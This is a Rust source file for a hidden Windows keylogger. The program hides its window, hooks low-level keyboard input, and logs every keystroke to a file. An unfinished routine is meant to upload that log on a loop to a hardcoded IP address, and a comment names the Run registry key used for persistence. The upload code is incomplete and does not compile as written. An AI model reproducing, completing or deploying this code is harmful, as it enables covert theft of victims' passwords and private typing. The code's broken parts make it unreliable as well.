#![windows_subsystem = "windows"]
use windows::Win32::{
    UI::WindowsAndMessaging::{
        CallNextHookEx, SetWindowsHookExW, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, GetMessageW, DispatchMessageW, TranslateMessage, MSG, HHOOK, WM_KEYDOWN, WH_KEYBOARD_LL
    },
    Foundation::{
        HINSTANCE, WPARAM, LPARAM, LRESULT, HWND
    }
};
use std::{
    mem::transmute,
    fs::OpenOptions,
    io::Write,
    thread::sleep,
    time::Duration
};
use reqwest;
//https://docs.rs/reqwest/latest/reqwest/
fn upload_file() {
    let mut last_file_size: u64 = 0;
    let c = reqwest::Client::new(); // should i make a new client every time or should I keep this client

    loop {
        sleep(Duration::from_secs(10));
        let current_file_size: u64 = 0; //get file size

        if current_file_size > last_file_size {
            last_file_size = current_file_size;
            c::post("http://172.22.210.157/UploadFile").body()
        }
    }

}

fn append_keycode_to_file(keycode: u8) -> std::io::Result<()> {
    let mut file = OpenOptions::new().create(true).append(true).open("h.hex")?;

    file.write_all(&keycode.to_ne_bytes())?;
    
    Ok(())
}

unsafe extern "system" fn keyboard_callback(code: i32, wp: WPARAM, lp: LPARAM) -> LRESULT {
    if code >= 0 && wp.0 as u32 == WM_KEYDOWN {
        let vk_code = (*transmute::<LPARAM, *const KBDLLHOOKSTRUCT>(lp)).vkCode;
        if let Ok(vk_code_u8) = u8::try_from(vk_code) {
            let _ = append_keycode_to_file(vk_code_u8).unwrap();
        }
    }
    CallNextHookEx(HHOOK::default(), code, wp, lp)
}

fn message_loop() {
    let mut message = MSG::default();
    unsafe {
        loop {
            GetMessageW(&mut message, HWND::default(), 0, 0);
            TranslateMessage(&message);
            DispatchMessageW(&message);
        }
    }
}

fn main() {
    let hook = unsafe {SetWindowsHookExW(
        WH_KEYBOARD_LL,
        Some(keyboard_callback),
        HINSTANCE::default(),
        0
    ).unwrap()};
    message_loop();
    std::io::stdin().read_line(&mut String::new()).unwrap();
    unsafe{UnhookWindowsHookEx(hook).unwrap()};
}

/*\
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
DOCS
https://learn.microsoft.com/en-us/windows/win32/winmsg/using-messages-and-message-queues
https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dispatchmessagew
https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessagew
https://stackoverflow.com/questions/75870904/how-to-correctly-set-a-wh-keyboard-hook-procedure-using-setwindowshookexw-in-rus
https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644984(v=vs.85)
*/